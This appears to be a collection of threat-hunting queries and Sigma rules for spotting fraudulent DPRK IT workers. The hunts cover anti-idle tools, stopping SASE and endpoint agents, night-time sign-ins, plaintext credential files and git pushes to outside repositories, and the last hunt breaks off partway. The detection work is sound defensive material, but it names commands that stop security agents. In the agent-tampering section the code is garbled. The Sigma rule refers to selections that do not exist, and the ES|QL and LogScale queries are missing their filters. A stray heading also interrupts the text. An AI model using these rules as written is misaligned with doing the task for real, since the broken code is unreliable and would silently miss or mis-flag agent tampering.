title: Anti-Idle and Mouse-Jiggling Tooling on Employee Endpoints
summary: Software that keeps a machine awake and an account showing as present, which is what an operator running several jobs at once needs on every laptop they are not currently at.
description: An operator holding four jobs cannot be at four keyboards. Mandiant records Caffeine used to remain active across several laptops and profiles; DTEX names caffeine.exe on Windows and owly on macOS; ReliaQuest notes IP-KVM hardware provides mouse-jiggling as a built-in feature, which is one reason the hardware is attractive.

The tooling is trivially available and the behaviour is not itself malicious, so what makes this hunt worth running is not the presence of the tool but the picture it completes: presence indicators that stay green through hours where nothing else on the device happens.
logic: Collect: process starts on Windows and macOS endpoints, last 90 days
Match: image is an anti-idle tool (Caffeine, MouseJiggler, MoveMouse, owly) or a common keep-awake tool (caffeinate, Amphetamine)
Report: devices and users with matches on 5 or more distinct days, most days first
technique_scope: Defence evasion of presence and idle-detection controls, supporting concurrent fraudulent employment (MITRE ATT&CK T1078).

indicators.note: Named by Mandiant as used to remain active across several laptops and profiles; DTEX names the same executable.
macOS anti-screen-lock tool named by DTEX.
Built-in macOS utility that prevents display sleep; the no-install equivalent of the above.

queries.note: Devices and accounts that ran an anti-idle tool on five or more distinct days in the last 90 days.

tuning.part: the PowerToys Awake, caffeinate, Amphetamine and KeepingYouAwake entries
tuning.reason: built-in or mainstream keep-awake tools that developers, presenters and people on long transfers run for good reasons
tuning.remove: Delete both lines beginning // optional:, the let CommonKeepAwake line below the first, and the or FileName in~ (CommonKeepAwake) line below the second.

queries.query:
```sourcetype placeholders: index=endpoint with Sysmon or EDR process events (process_name, host, user)```
```optional: the second IN list is keep-awake tools that developers and presenters also run```
index=endpoint earliest=-90d (process_name IN ("caffeine.exe", "caffeine64.exe", "mousejiggler.exe", "movemouse.exe", "owly") OR process_name IN ("PowerToys.Awake.exe", "caffeinate", "Amphetamine", "KeepingYouAwake"))
| eval day=strftime(_time, "%Y-%m-%d")
| stats count AS executions dc(day) AS active_days values(process_name) AS tools max(_time) AS last_seen BY host, user
| where active_days>=5
| sort 0 - active_days
| convert ctime(last_seen)
queries.note: Hosts and users that ran an anti-idle tool on five or more distinct days in the last 90 days.

tuning.part: the PowerToys Awake, caffeinate, Amphetamine and KeepingYouAwake entries
tuning.reason: built-in or mainstream keep-awake tools that developers, presenters and people on long transfers run for good reasons
tuning.remove: Delete the optional comment and, on the index line, the text OR process_name IN ("PowerToys.Awake.exe", ...) up to the closing parenthesis of the group.

queries.query:
title: Anti-Idle or Mouse-Jiggling Utility Executed on an Employee Endpoint
id: c3a7f0b4-92d1-4e58-8a36-5d1b7e90f2a6
status: experimental
description: >
  Detects utilities whose only function is to keep a host awake and an account
  showing as present. Mandiant reports Caffeine used by DPRK IT workers to
  remain active across several laptops and profiles simultaneously; DTEX names
  caffeine.exe on Windows and owly on macOS. One execution is ordinary; report
  devices that run one on five or more distinct days.
references:
  - https://cloud.google.com/blog/topics/threat-intelligence/mitigating-dprk-it-worker-threat
  - https://www.dtex.ai/resources/i3-threat-advisory-inside-the-dprk/
logsource:
  category: process_creation
detection:
  selection_anti_idle:
    Image|endswith:
      - '\caffeine.exe'
      - '\caffeine64.exe'
      - '\MouseJiggler.exe'
      - '\MoveMouse.exe'
      - '/owly'
  # optional: keep-awake tools that developers and presenters also run
  selection_common:
    Image|endswith:
      - '\PowerToys.Awake.exe'
      - '/caffeinate'
      - '/Amphetamine'
      - '/KeepingYouAwake'
  condition: 1 of selection_*
falsepositives:
  - Users running long builds, renders, transfers or presentations who do not want the screen to lock
level: low
queries.note: A single execution of an anti-idle or keep-awake tool, meant to be counted per device by the SIEM.

tuning.part: the PowerToys Awake, caffeinate, Amphetamine and KeepingYouAwake entries
tuning.reason: built-in or mainstream keep-awake tools that developers, presenters and people on long transfers run for good reasons
tuning.remove: Delete the # optional: line and selection_common with its list, and change the condition to selection_anti_idle.

queries.query:
FROM logs-endpoint.events.process-*
| WHERE @timestamp > NOW() - 90 days
| EVAL tool = TO_LOWER(process.name)
| WHERE tool IN ("caffeine.exe", "caffeine64.exe", "mousejiggler.exe", "movemouse.exe", "owly") OR tool IN ("powertoys.awake.exe", "caffeinate", "amphetamine", "keepingyouawake")
| EVAL day = DATE_TRUNC(1 day, @timestamp)
| STATS executions = COUNT(*), active_days = COUNT_DISTINCT(day), tools = VALUES(process.name), last_seen = MAX(@timestamp) BY host.name, user.name
| WHERE active_days >= 5
| SORT active_days DESC
| LIMIT 200
queries.note: Hosts and users that ran an anti-idle tool on five or more distinct days in the last 90 days.

tuning.part: the PowerToys Awake, caffeinate, Amphetamine and KeepingYouAwake entries
tuning.reason: built-in or mainstream keep-awake tools that developers, presenters and people on long transfers run for good reasons
tuning.remove: Delete OR tool IN ("powertoys.awake.exe", ...) from the second WHERE line.

queries.query:
#event_simpleName=ProcessRollup2
| in(field=FileName, values=["caffeine.exe", "caffeine64.exe", "mousejiggler.exe", "movemouse.exe", "owly"], ignoreCase=true)
  // optional: keep-awake tools that developers and presenters also run
  or in(field=FileName, values=["PowerToys.Awake.exe", "caffeinate", "Amphetamine", "KeepingYouAwake"], ignoreCase=true)
| formatTime("%Y-%m-%d", field=@timestamp, as=day)
| groupBy([aid, ComputerName, UserName], function=[count(as=executions), count(day, distinct=true, as=active_days), collect(FileName), max(@timestamp, as=last_seen)])
| active_days >= 5
| sort(active_days, order=desc)
queries.note: Devices and users that ran an anti-idle tool on five or more distinct days in the last 90 days.

tuning.part: the PowerToys Awake, caffeinate, Amphetamine and KeepingYouAwake entries
tuning.reason: built-in or mainstream keep-awake tools that developers, presenters and people on long transfers run for good reasons
tuning.remove: Delete the line beginning // optional: and the or in(...) line after it.

queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS
| alter tool = lowercase(action_process_image_name)
| filter tool in ("caffeine.exe", "caffeine64.exe", "mousejiggler.exe", "movemouse.exe", "owly")
    // optional: keep-awake tools that developers and presenters also run
    or tool in ("powertoys.awake.exe", "caffeinate", "amphetamine", "keepingyouawake")
| bin _time span = 1d
| comp count() as executions, count_distinct(_time) as active_days, values(tool) as tools by agent_hostname, actor_effective_username
| filter active_days >= 5
| sort desc active_days
queries.note: Hosts and users that ran an anti-idle tool on five or more distinct days in the last 90 days.

tuning.part: the PowerToys Awake, caffeinate, Amphetamine and KeepingYouAwake entries
tuning.reason: built-in or mainstream keep-awake tools that developers, presenters and people on long transfers run for good reasons
tuning.remove: Delete the line beginning // optional: and the or tool in (...) line after it.

queries.query:
SELECT name, path, cmdline, uid
FROM processes
WHERE lower(name) IN ('caffeine.exe', 'caffeine64.exe', 'mousejiggler.exe', 'movemouse.exe', 'owly')
   -- optional: keep-awake tools that developers and presenters also run
   OR lower(name) IN ('powertoys.awake.exe', 'caffeinate', 'amphetamine', 'keepingyouawake');
queries.note: Anti-idle and keep-awake processes running now, on Windows or macOS, as a point-in-time check without process telemetry.

tuning.part: the PowerToys Awake, caffeinate, Amphetamine and KeepingYouAwake entries
tuning.reason: built-in or mainstream keep-awake tools that developers, presenters and people on long transfers run for good reasons
tuning.remove: Delete the -- optional: line and the OR lower(name) IN (...) line after it, then end the line above with a semicolon.

false_positive_notes: Keeping a machine awake is ordinary: long builds, transfers, rendering and presenting all produce it. Treat this as one column in an insider-risk review beside session length and working hours, not as an alert.

Note the significant blind spot ReliaQuest identifies: an IP-KVM performs mouse jiggling in hardware, so the operators furthest along in their tradecraft leave no software artifact for this hunt to find at all.

title: SASE and Endpoint Agent Tampering by an Employee
summary: Disabling the SASE or endpoint agent is how an operator gets their own traffic out from under inspection. DTEX rates it low-recall but high-precision: it does not happen often, and when it does it means something.
description: DTEX observed Zscaler and Netskope agents being disabled on endpoints in DPRK IT-worker cases and points defenders to MITRE ATT&CK T1562.001, rating the indicator low recall, high precision. Most operators never touch the agent, but an ordinary employee has little reason or knowledge to stop the SASE tunnel, so a match deserves attention on its own terms.

The same logic extends to the endpoint agent itself on Windows and macOS, and Huntress's August 2026 case is a reminder that the absence of an agent is its own finding: the suspected worker had been onboarded and no agent had yet been installed on the device.
logic: Collect: process starts on Windows and macOS endpoints, last 30 days
Match: image is a service-control, kill or agent CLI tool (sc, net, taskkill, powershell, launchctl, killall, mdatp, falconctl)
Match: command line has a stop verb (stop, disable, kill, unload, bootout, delete, remove) and names a SASE or endpoint agent
Exclude: IT-support accounts
Report: each event with device, account, command line and parent, newest first
technique_scope: Impair Defenses: Disable or Modify Tools (MITRE ATT&CK T1562.001) on a corporate endpoint held by a fraudulently hired employee.

indicators.note: SASE agent observed being disabled in DPRK IT-worker cases (DTEX).
SASE agent observed being disabled in DPRK IT-worker cases (DTEX).

queries.note: Each row is a service-control, kill or agent command that names a SASE or endpoint agent, outside the IT-support accounts.

tuning.reason: they also match ordinary uninstall and clean-up commands that name an agent
tuning.remove: Delete |delete|remove from the verb regex and the // optional: comment above it.

queries.query:
```sourcetype placeholders: index=endpoint with Sysmon or EDR process events (process_name, process, parent_process_name, host, user)```
```replace the placeholder with IT-support accounts, and add your own agent's service and process names to the second regex```
index=endpoint earliest=-30d process_name IN ("sc.exe", "net.exe", "net1.exe", "taskkill.exe", "powershell.exe", "pwsh.exe", "wmic.exe", "launchctl", "killall", "pkill", "kill", "mdatp", "falconctl")
| regex process="(?i)(zsatunnel|zsaservice|zscaler|zsatray|stagentsvc|stagentui|nsservice|netskope|sentinelagent|cselement|csfalconservice|cbdefense|mssense|fresno|wdavdaemon|falcond|falconctl|mdatp)"
```optional: delete and remove also match ordinary uninstall and clean-up commands```
| regex process="(?i)(stop|disable|kill|unload|bootout|delete|remove)"
| search NOT user IN ("svc-it-support")
| table _time, host, user, process_name, parent_process_name, process
| sort 0 - _time
queries.note: Each row is a service-control, kill or agent command that names a SASE or endpoint agent, outside the IT-support accounts.

tuning.reason: they also match ordinary uninstall and clean-up commands that name an agent
tuning.remove: Delete |delete|remove from the verb regex and the optional comment above it.

queries.query:
title: SASE or Endpoint Agent Stopped or Disabled from an Employee Session
id: 9e2d4a71-3c85-4b06-b1f9-60a7d3c8e5f2
status: experimental
description: >
  Detects service-control, process-kill or agent command-line tools aimed at
  SASE and endpoint security agents on Windows and macOS. DTEX observed Zscaler
  and Netskope agents being disabled in DPRK IT-worker cases and rates the
  indicator low-recall, high-precision: rare, and meaningful when it occurs.
references:
  - https://www.dtex.ai/resources/i3-threat-advisory-inside-the-dprk/
  - https://attack.mitre.org/techniques/T1562/001/
logsource:
  category: process_creation
detection:
  selection_tool:
    Image|endswith:
      - '\sc.exe'
      - '\net.exe'
      - '\net1.exe'
      - '\taskkill.exe'
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\wmic.exe'
      - '/launchctl'
      - '/killall'
      - '/pkill'
      - '/kill'
      - '/mdatp'

      - 'stagentui'
      - 'nsservice'
      - 'netskope'
      - 'sentinelagent'
      - 'cselement'
      - 'csfalconservice'
      - 'cbdefense'
      - 'mssense'
      - 'fresno'
      - 'wdavdaemon'
      - 'falcond'
      - 'falconctl'
      - 'mdatp'
  condition: selection_tool and selection_verb and selection_agent
falsepositives:
  - Sanctioned IT support troubleshooting connectivity, which should be correlated against an open ticket

queries.note: A single service-control, kill or agent command that names a SASE or endpoint agent, level high because it is rare.

tuning.reason: they also match ordinary uninstall and clean-up commands that name an agent

queries.query:
FROM logs-endpoint.events.process-*
| WHERE @timestamp > NOW() - 30 days AND event.action IN ("start", "exec")
| WHERE TO_LOWER(process.name) IN ("sc.exe", "net.exe", "net1.exe", "taskkill.exe", "powershell.exe", "pwsh.exe", "wmic.exe", "launchctl", "killall", "pkill", "kill", "mdatp", "falconctl")

| SORT @timestamp DESC
| LIMIT 200
queries.note: Each row is a service-control, kill or agent command that names a SASE or endpoint agent, outside the IT-support accounts.

tuning.reason: they also match ordinary uninstall and clean-up commands that name an agent

queries.query:
// Replace the placeholder with IT-support accounts, and add your own agent's service and process names to the second regular expression.

| in(field=FileName, values=["sc.exe", "net.exe", "net1.exe", "taskkill.exe", "powershell.exe", "pwsh.exe", "wmic.exe", "launchctl", "killall", "pkill", "kill", "mdatp", "falconctl"], ignoreCase=true)

| !in(field=UserName, values=["svc-it-support"])
| table([@timestamp, ComputerName, UserName, FileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
queries.note: Each row is a service-control, kill or agent command that names a SASE or endpoint agent, outside the IT-support accounts.

tuning.reason: they also match ordinary uninstall and clean-up commands that name an agent

queries.query:
// Replace the placeholder with IT-support accounts, and add your own agent's service and process names to the second regular expression.
dataset = xdr_data
| filter event_type = ENUM.PROCESS and lowercase(action_process_image_name) in ("sc.exe", "net.exe", "net1.exe", "taskkill.exe", "powershell.exe", "pwsh.exe", "wmic.exe", "launchctl", "killall", "pkill", "kill", "mdatp", "falconctl")
| filter action_process_image_command_line ~= "(?i)(zsatunnel|zsaservice|zscaler|zsatray|stagentsvc|stagentui|nsservice|netskope|sentinelagent|cselement|csfalconservice|cbdefense|mssense|fresno|wdavdaemon|falcond|falconctl|mdatp)"
// optional: delete and remove also match ordinary uninstall and clean-up commands
| filter action_process_image_command_line ~= "(?i)(stop|disable|kill|unload|bootout|delete|remove)"
| filter actor_effective_username not in ("svc-it-support")
| fields _time, agent_hostname, actor_effective_username, action_process_image_name, action_process_image_command_line, actor_process_image_name
| sort desc _time
queries.note: Each row is a service-control, kill or agent command that names a SASE or endpoint agent, outside the IT-support accounts.

tuning.reason: they also match ordinary uninstall and clean-up commands that name an agent
tuning.remove: Delete |delete|remove from the verb regular expression and the // optional: line above it.

false_positive_notes: The main legitimate source is your own IT function troubleshooting connectivity, so correlate every hit against an open ticket. Some SASE agents restart through service-control commands during upgrades; exclude the vendor updater as parent.

DTEX's indicator has low recall, so absence says nothing and it should not be the only agent-integrity control. The agent list extends DTEX's two products with common endpoint agents, an extension that is this site's.

title: Working-Hour and Session-Length Anomalies for Recent Hires
summary: Sustained sign-ins at times that make no sense for where the employee says they live, which is how an operator working several jobs round the clock shows in the identity logs. Excessive working hours is among the highest-rated indicators in DTEX's own casework.
description: Of the fourteen indicators DTEX rates, excessive working hours and new-joiner status are the only two scored high on both recall and precision. The behaviour follows from the business model: an operator holding several jobs works across all of them continuously, and DTEX records intervals between logon and logoff of one to twenty-three days against a normal daily pattern.

Huntress makes the timezone point and adds a caution: baseline each employee's local timezone, and treat sustained access at inconsistent hours as stronger beside VPN or proxy use than alone. This hunt measures the share of a recent hire's sign-ins that fall in the night window of the claimed location, scoped through a NewHires list.
logic: Collect: successful interactive sign-ins from Entra ID or Okta, last 60 days
Match: the user is on the NewHires list (hired in the last 180 days, exported from the HR system)
Match: the sign-in falls in the night window, 22:00 to 05:59, of the claimed local time
Report: users with 10 or more active days and more than 40% of sign-ins in the night window
technique_scope: Valid-account misuse (MITRE ATT&CK T1078) surfaced by session and activity patterns inconsistent with a single person in the stated location.

queries.query:
// Requires a watchlist named NewHires with a UserPrincipalName column holding hires of the last 180 days, exported from the HR system.
let RecentHires = _GetWatchlist('NewHires') | project UserPrincipalName = tostring(UserPrincipalName);
// TimeGenerated is UTC: set OffsetHours to the UTC offset of the claimed location.
let OffsetHours = -5;
SigninLogs
| where TimeGenerated > ago(60d)
| where ResultType == "0"
| join kind=inner RecentHires on UserPrincipalName
| extend LocalHour = datetime_part("hour", TimeGenerated + OffsetHours * 1h)
| summarize Total = count(),
            NightSignIns = countif(LocalHour >= 22 or LocalHour <= 5),
            ActiveDays = dcount(bin(TimeGenerated, 1d)),
            Countries = make_set(tostring(LocationDetails.countryOrRegion))
        by UserPrincipalName
| extend NightRatio = round(todouble(NightSignIns) / todouble(Total), 2)
| where ActiveDays >= 10 and NightRatio > 0.4
| sort by NightRatio desc
queries.note: Recent hires whose sign-ins fall mostly in the night window of the claimed location on ten or more days; set OffsetHours before running it.

tuning.part: the single claimed UTC offset (-5 hours, or America/New_York in LogScale)
tuning.reason: one offset for every user ignores daylight saving and employees who relocated, which moves sign-ins in and out of the night window
tuning.remove: Add a UtcOffset column to the NewHires watchlist and replace OffsetHours with toint(UtcOffset) projected through the join.

queries.query:
```sourcetype placeholders: ms:aad:signin (Entra ID) and okta; new_hires.csv has user and start_date columns holding hires of the last 180 days```
```claimed_offset is the UTC offset in hours of the claimed location```
index=identity (sourcetype="ms:aad:signin" OR sourcetype=okta) action=success earliest=-60d
| lookup new_hires.csv user OUTPUT start_date
| where isnotnull(start_date)
| iplocation src_ip
| eval claimed_offset=-5
| eval local_hour=floor(((_time + (claimed_offset * 3600)) % 86400) / 3600)
| eval night=if(local_hour>=22 OR local_hour<=5, 1, 0)
| eval day=floor((_time + (claimed_offset * 3600)) / 86400)
| stats count AS total sum(night) AS night_sign_ins dc(day) AS active_days values(Country) AS countries BY user
| eval night_ratio=round(night_sign_ins/total, 2)
| where active_days>=10 AND night_ratio>0.4
| sort 0 - night_ratio
queries.note: Recent hires whose sign-ins fall mostly in the night window of the claimed location on ten or more days; set claimed_offset before running it.

tuning.part: the single claimed UTC offset (-5 hours, or America/New_York in LogScale)
tuning.reason: one offset for every user ignores daylight saving and employees who relocated, which moves sign-ins in and out of the night window
tuning.remove: Add a utc_offset column to new_hires.csv, output it in the lookup and replace the eval claimed_offset=-5 line with it.

queries.query:
FROM logs-azure.signinlogs-*
| WHERE @timestamp > NOW() - 60 days AND event.outcome == "success"
| EVAL upn = TO_LOWER(azure.signinlogs.properties.user_principal_name)
| LOOKUP JOIN new_hires ON upn
| WHERE start_date IS NOT NULL
| EVAL local_hour = DATE_EXTRACT("hour_of_day", @timestamp - 5 hours)
| EVAL night = CASE(local_hour >= 22 OR local_hour <= 5, 1, 0), day = DATE_TRUNC(1 day, @timestamp - 5 hours)
| STATS total = COUNT(*), night_sign_ins = SUM(night), active_days = COUNT_DISTINCT(day), countries = VALUES(source.geo.country_iso_code) BY upn
| EVAL night_ratio = ROUND(TO_DOUBLE(night_sign_ins) / total, 2)
| WHERE active_days >= 10 AND night_ratio > 0.4
| SORT night_ratio DESC
| LIMIT 200
queries.note: Recent hires, joined from the new_hires lookup index with upn and start_date fields, whose sign-ins fall mostly in the night window on ten or more days.

tuning.part: the single claimed UTC offset (-5 hours, or America/New_York in LogScale)
tuning.reason: one offset for every user ignores daylight saving and employees who relocated, which moves sign-ins in and out of the night window
tuning.remove: Add a utc_offset field to the new_hires lookup index and replace the two 5 hours expressions with it.

queries.query:
// Entra ID sign-ins parsed into ECS-style fields; new_hires.csv has a user column holding hires of the last 180 days; replace the timezone with the claimed one.
event.outcome=success
| match(file="new_hires.csv", field=user.name, column=user)
| formatTime("%H", field=@timestamp, as=local_hour, timezone="America/New_York")
| formatTime("%Y-%m-%d", field=@timestamp, as=day, timezone="America/New_York")
| case { local_hour=/^(22|23|00|01|02|03|04|05)$/ | night := 1; * | night := 0 }
| groupBy([user.name], function=[count(as=total), sum(night, as=night_sign_ins), count(day, distinct=true, as=active_days)])
| night_ratio := night_sign_ins / total
| active_days >= 10 and night_ratio > 0.4
| sort(night_ratio, order=desc)
queries.note: Recent hires whose sign-ins fall mostly in the night window of the claimed timezone on ten or more days.

tuning.part: the single claimed UTC offset (-5 hours, or America/New_York in LogScale)
tuning.reason: one offset for every user ignores daylight saving and employees who relocated, which moves sign-ins in and out of the night window
tuning.remove: Replace the timezone argument with a per-user value by adding a timezone column to new_hires.csv and including it in match().

false_positive_notes: On-call rotations, follow-the-sun teams, nocturnal employees and anyone who relocated without telling HR will appear here. The single claimed-offset constant is a simplification; use an HR feed with one offset per employee.
Sign-in logs record authentications, not presence: a session that never ends produces few sign-ins, so a quiet account can still be a round-the-clock one.
Give particular weight to accounts where the pattern started at hire rather than drifted into place.

title: Plaintext Credential Notes on Employee Endpoints
summary: Text files full of passwords in the obvious folders, which DTEX records in DPRK IT-worker casework as an operator's way of keeping credentials for several employers within reach.
description: DTEX records two related behaviours in its DPRK IT-worker casework: text files holding authentication secrets in the Desktop, Documents and Downloads folders, and multiple logins from different addresses with abnormal file-repository reconnaissance. The first is a working practice, an operator keeping credentials for several employers somewhere reachable, rated low recall with moderate precision.

DTEX's second behaviour, multiple logins from different addresses with abnormal file-repository reconnaissance, matters because placements often end in data theft or extortion. It is read from file-share audit logs, not endpoint file events, so this hunt covers the first behaviour and is most useful run against accounts other hunts have already flagged.
logic: Collect: file creations and modifications on Windows and macOS endpoints, last 90 days
Match: the file sits under a Desktop, Documents or Downloads folder (either path separator)
Match: the file name has a credential word (password, pwd, credential, secret, mnemonic) and is .txt, .csv or .rtf
Report: each file with device, account, path and writing process, newest first
technique_scope: Unsecured Credentials in files (MITRE ATT&CK T1552.001) on a corporate endpoint held by a fraudulently hired employee.

indicators.value: Desktop, Documents, Downloads (Windows and /Users/*/ on macOS)
indicators.note: Where DTEX observed text files holding authentication secrets.

queries.query:
DeviceFileEvents
| where Timestamp > ago(90d)
| where ActionType in ("FileCreated", "FileModified")
| where FolderPath matches regex @"(?i)[\\/](desktop|documents|downloads)([\\/]|$)"
| where FileName matches regex @"(?i)(password|passwd|pwd|credential|creds|secret|mnemonic|backupcode).*\.(txt|csv|rtf)$"
     // optional: short stems that also match ordinary files such as bypass.txt or accounts.csv
     or FileName matches regex @"(?i)(pass|cred|login|logon|account|key|seed|otp|mfa|totp|recovery).*\.(txt|csv|rtf)$"
| project Timestamp, DeviceName, InitiatingProcessAccountName, FolderPath, FileName, InitiatingProcessFileName
| sort by Timestamp desc
queries.note: Credential-named text, CSV and RTF files written to the three user folders on Windows or macOS, matched on the file name alone.

tuning.part: the short stems pass, cred, login, logon, account, key, seed, otp, mfa, totp and recovery
tuning.reason: substrings that also match ordinary files such as bypass.txt, monkey.csv or accounts.csv, so the stems add volume faster than precision
tuning.remove: Delete the line beginning // optional: and the or line after it.

```sourcetype placeholders: index=endpoint sourcetype=file_events with file_path, file_name, host, user and process_name; the path is the full path```
```optional: the second name pattern holds short stems that also match ordinary files such as bypass.txt or accounts.csv```
index=endpoint sourcetype=file_events earliest=-90d
| eval path=lower(file_path), name=lower(file_name)
| where match(path, "[\\\\/](desktop|documents|downloads)[\\\\/]")
| where match(name, "(password|passwd|pwd|credential|creds|secret|mnemonic|backupcode).*\\.(txt|csv|rtf)$") OR match(name, "(pass|cred|login|logon|account|key|seed|otp|mfa|totp|recovery).*\\.(txt|csv|rtf)$")
| table _time, host, user, file_path, file_name, process_name
| sort 0 - _time

queries.query:
SELECT path, filename, size, datetime(mtime, 'unixepoch') AS modified
FROM file
WHERE (path LIKE '/Users/%/Desktop/%' OR path LIKE '/Users/%/Documents/%' OR path LIKE '/Users/%/Downloads/%'
    OR path LIKE 'C:\Users\%\Desktop\%' OR path LIKE 'C:\Users\%\Documents\%' OR path LIKE 'C:\Users\%\Downloads\%')
  AND (filename LIKE '%.txt' OR filename LIKE '%.csv' OR filename LIKE '%.rtf')
  AND (filename LIKE '%password%' OR filename LIKE '%passwd%' OR filename LIKE '%pwd%' OR filename LIKE '%credential%' OR filename LIKE '%creds%' OR filename LIKE '%secret%' OR filename LIKE '%mnemonic%' OR filename LIKE '%backupcode%'
       -- optional: short stems that also match ordinary files such as bypass.txt or accounts.csv
       OR filename LIKE '%pass%' OR filename LIKE '%cred%' OR filename LIKE '%login%' OR filename LIKE '%logon%' OR filename LIKE '%account%' OR filename LIKE '%key%' OR filename LIKE '%seed%' OR filename LIKE '%otp%' OR filename LIKE '%mfa%' OR filename LIKE '%totp%' OR filename LIKE '%recovery%');
queries.note: Credential-named text, CSV and RTF files sitting directly in the three folders of every user profile on this host now.

tuning.part: the short stems pass, cred, login, logon, account, key, seed, otp, mfa, totp and recovery
tuning.reason: substrings that also match ordinary files such as bypass.txt, monkey.csv or accounts.csv, so the stems add volume faster than precision
tuning.remove: Delete the -- optional: line and the OR line after it, leaving the closing parenthesis and semicolon on the line above.

false_positive_notes: Many people keep a passwords.txt they should not, and it says more about security awareness than nationality. Filename matching is only a proxy: secrets in notes.txt are invisible to it.
This is context to pull for an account already flagged by something more precise, not an alert; DTEX rates its recall low.
Backup agents, search indexers and sync clients write to these folders constantly, so exclude service accounts and their processes before reading the result.

Insights into Suspected DPRK Workers: Red Flags to Look Out For

title: Company Source Code Pushed to Personal Repositories from an Employee Endpoint
summary: Git pushes, remote changes and mirror clones aimed at accounts outside the organisation on public hosting services: the precursor to the data-extortion the FBI now attributes to discovered DPRK IT workers.
description: The FBI's January 2025 announcement records a change in what happens when a DPRK IT worker is caught. Alongside the fraud, workers have copied company code repositories such as GitHub to their own user profiles and, after termination, held the stolen code and proprietary data for ransom.

The copying leaves two kinds of evidence. Where the source-control audit log records clones and archive downloads, an employee pulling tens of repositories they have no work in, especially in their first weeks, stands out. On the endpoint, a git push, remote add or mirror clone whose target is an account outside the organisation is the act itself.

This hunt covers the endpoint side, which any EDR can see; the audit-log side needs the source-control audit stream and is read there. It complements the credential-notes hunt, which looks at what the same employee keeps rather than what they take.
logic: Collect: git process starts on Windows and macOS endpoints, last 30 days
Match: command line is a remote add, remote set-url, clone --mirror or push
Match: command line names a public hosting service (github.com, gitlab.com, bitbucket.org, gitee.com)
Exclude: the organisation's own paths on those services (your-org placeholder)
Report: each command with device, account, command line and parent, newest first
technique_scope: Data from information repositories and code repositories (MITRE ATT&CK T1213.003), exfiltration to a code repository or web service (T1567.001, T1567) by a fraudulently hired insider (T1078), preceding financial extortion.

queries.query:
// Replace your-org with the organisation's own paths on the hosting services.
let OrgPaths = @"(?i)(github\.com|gitlab\.com|bitbucket\.org)[/:]your-org/";
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName in~ ("git.exe", "git")
| where ProcessCommandLine matches regex @"(?i)(remote add|remote set-url|clone --mirror)"
     // optional: every push to a public service, including legitimate open-source work
     or ProcessCommandLine contains " push "
| where ProcessCommandLine matches regex @"(?i)(github\.com|gitlab\.com|bitbucket\.org|gitee\.com)"
| where not(ProcessCommandLine matches regex OrgPaths)
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| sort by Timestamp desc
queries.note: git commands that change a remote, mirror-clone or push to a public hosting service outside the organisation's own paths.

tuning.reason: it matches every push to a public hosting service, including ordinary open-source contributions, where remote add, remote set-url and clone --mirror are the stronger signs of a copy
tuning.remove: Delete the line beginning // optional: and the or line after it.

queries.query:
```sourcetype placeholders: index=endpoint with Sysmon or EDR process events (process_name, process, parent_process_name, host, user)```
```replace your-org with the organisation's own paths on the hosting services```
```optional: the OR match for push covers every push to a public service, including legitimate open-source work```
index=endpoint earliest=-30d process_name IN ("git.exe", "git")
| where match(process, "(?i)(remote add|remote set-url|clone --mirror)") OR match(process, "(?i) push ")
| where match(process, "(?i)(github\.com|gitlab\.com|bitbucket\.org|gitee\.com)")
| where NOT match(process, "(?i)(github\.com|gitlab\.com|bitbucket\.org)[/:]your-org/")
| table _time, host, user, process, parent_process_name
| sort 0 - _time
queries.note: git commands that change a remote, mirror-clone or push to a public hosting service outside the organisation's own paths.

tuning.reason: it matches every push to a public hosting service, including ordinary open-source contributions, where remote add, remote set-url and clone --mirror are the stronger signs of a copy
tuning.remove: Delete OR match(process, "(?i) push ") from the first where line.

queries.query:
title: Git Remote Change or Push Targeting a Public Hosting Service
id: 7c1f9d28-b4a3-4e60-85d7-0a3e6f12c9b5
status: experimental
description: >
  Detects git adding or re-pointing a remote, mirror-cloning, or pushing to a
  public code-hosting service from an employee endpoint on Windows or macOS.
  Replace the your-org paths with the organisation's own paths on those
  services; the residue is code leaving the company, which the FBI documents
  as the precursor to extortion by DPRK IT workers.
references:
  - https://www.ic3.gov/PSA/2025/PSA250123
logsource:
  category: process_creation
detection:
  selection_image:
    Image|endswith:
      - '\git.exe'
      - '/git'
  selection_verb:
    CommandLine|contains:
      - 'remote add'
      - 'remote set-url'
      - 'clone --mirror'
  # optional: every push to a public service, including legitimate open-source work
  selection_push:
    CommandLine|contains: ' push '
  selection_host:
    CommandLine|contains:
      - 'github.com'
      - 'gitlab.com'
      - 'bitbucket.org'
      - 'gitee.com'
  filter_org:
    CommandLine|contains:
      - 'github.com/your-org/'
      - 'github.com:your-org/'
      - 'gitlab.com/your-org/'
      - 'gitlab.com:your-org/'
      - 'bitbucket.org/your-org/'
      - 'bitbucket.org:your-org/'
  condition: selection_image and (selection_verb or selection_push) and selection_host and not filter_org
falsepositives:
  - Developers contributing to open-source projects from a work machine
level: low
queries.note: A single git command that changes a remote, mirror-clones or pushes to a public hosting service outside the organisation's own paths.

tuning.reason: it matches every push to a public hosting service, including ordinary open-source contributions, where remote add, remote set-url and clone --mirror are the stronger signs of a copy
tuning.remove: Delete the # optional: line and selection_push, and change the condition to selection_image and selection_verb and selection_host and not filter_org.

queries.query:
FROM logs-endpoint.events.process-*
| WHERE @timestamp > NOW() - 30 days AND event.action IN ("start", "exec") AND TO_LOWER(process.name) IN ("git.exe", "git")
| EVAL cmd = TO_LOWER(process.command_line)
| WHERE cmd RLIKE ".*(remote add|remote set-url|clone --mirror).*" OR cmd RLIKE ".* push .*"
| WHERE cmd RLIKE ".*(github\\.com|gitlab\\.com|bitbucket\\.org|gitee\\.com).*"
| WHERE NOT cmd RLIKE ".*(github\\.com|gitlab\\.com|bitbucket\\.org)[/:]your-org/.*"
| KEEP @timestamp, host.name, user.name, process.command_line, process.parent.name
| SORT @timestamp DESC
| LIMIT 200
queries.note: git commands that change a remote, mirror-clone or push to a public hosting service outside the organisation's own paths.

tuning.reason: it matches every push to a public hosting service, including ordinary open-source contributions, where remote add, remote set-url and clone --mirror are the stronger signs of a copy
tuning.remove: Delete OR cmd RLIKE ".* push .*" from the third WHERE line.

queries.query:
// Replace your-org with the organisation's own paths on the hosting services.
#event_simpleName=ProcessRollup2
| in(field=FileName, values=["git.exe", "git"], ignoreCase=true)
| CommandLine=/(remote add|remote set-url|clone --mirror)/i
    // optional: every push to a public service, including legitimate open-source work
